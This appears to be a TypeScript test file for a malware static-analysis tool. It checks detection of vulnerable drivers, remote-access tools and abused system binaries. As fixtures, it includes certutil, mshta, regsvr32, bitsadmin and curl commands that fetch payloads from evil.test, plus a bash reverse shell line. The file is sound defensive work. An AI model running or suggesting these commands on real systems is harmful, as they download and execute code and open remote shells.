import assert from 'node:assert/strict';
import { test } from 'node:test';

import { lolOf } from '../../src/lib/lol';
import DRIVERS from '../../src/lib/lol/loldrivers.json';
import { analyzeBuffer } from '../../src/lib/static-analysis';

// Abuso conhecido (plans/analise-estatica-ampliada, item 4).

const table = DRIVERS as unknown as {
  drivers: { name: string; category: string }[];
  hashes: Record<string, number>;
};

test('driver do LOLDrivers pelo authentihash, e pelo SHA-256 só quando é driver', () => {
  const [hash, index] = Object.entries(table.hashes)[0];
  const byAuth = lolOf({ authentihash: hash })!;
  assert.equal(byAuth.driver?.name, table.drivers[index].name);
  assert.equal(byAuth.driver?.by, 'authentihash');
  assert.equal(byAuth.alerts[0].level, 'high');
  assert.equal(lolOf({ sha256: hash, driver: false }), null);
  assert.equal(lolOf({ sha256: hash, driver: true })?.driver?.by, 'sha256');
});

test('ferramenta do LOLRMM pelo produto, pelo assinante e pelo domínio de relay', () => {
  assert.deepEqual(
    lolOf({ version: { ProductName: 'AnyDesk' } })?.rmm.map((r) => [r.name, r.by]),
    [['AnyDesk', 'product']],
  );
  assert.equal(
    lolOf({ signer: 'TeamViewer Germany GmbH' })?.rmm.some(
      (r) => r.name === 'TeamViewer' && r.by === 'signer',
    ),
    true,
  );
  const relay = lolOf({ hosts: ['instance-abc123-relay.screenconnect.com'] })!;
  assert.ok(relay.rmm.some((r) => r.name === 'ScreenConnect' && r.by === 'domain'));
  assert.equal(relay.alerts.find((a) => a.text.includes('ScreenConnect'))?.level, 'info');
  // Produto comum nao vira ferramenta de acesso remoto.
  assert.equal(lolOf({ version: { ProductName: 'Microsoft Windows Operating System' } }), null);
});

test('binários do sistema: só com o argumento que denuncia o abuso', () => {
  const texts = [
    'certutil -urlcache -split -f http://evil.test/a.exe %TEMP%\\a.exe',
    'mshta https://evil.test/x.hta',
    'regsvr32 /s /n /u /i:http://evil.test/x.sct scrobj.dll',
    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    'curl -fsSL http://evil.test/i.sh | sudo bash',
  ];
  const r = lolOf({ texts })!;
  assert.deepEqual(
    r.lolbins.map((b) => b.name),
    ['certutil', 'mshta', 'regsvr32', 'bash', 'curl'],
  );
  assert.deepEqual(r.lolbins[0].uses, ['download', 'decode']);
  assert.equal(r.lolbins[0].evidence, texts[0]);
  assert.match(r.lolbins[0].url, /^https:\/\/lolbas-project\.github\.io\//);
  assert.equal(r.alerts.at(-1)?.level, 'medium');
  // O binario sozinho (instalador comum) nao conta.
  assert.equal(lolOf({ texts: ['certutil -hashfile a.exe SHA256', 'regsvr32 /s comp.dll'] }), null);
});

test('entra na análise estática de um .bat', () => {
  const info = analyzeBuffer(
    Buffer.from(
      '@echo off\r\nbitsadmin /transfer j /download http://evil.test/p.exe %TEMP%\\p.exe\r\n',
    ),
    'baixa.bat',
  );
  assert.equal(info.lol?.lolbins[0]?.name, 'bitsadmin');
});
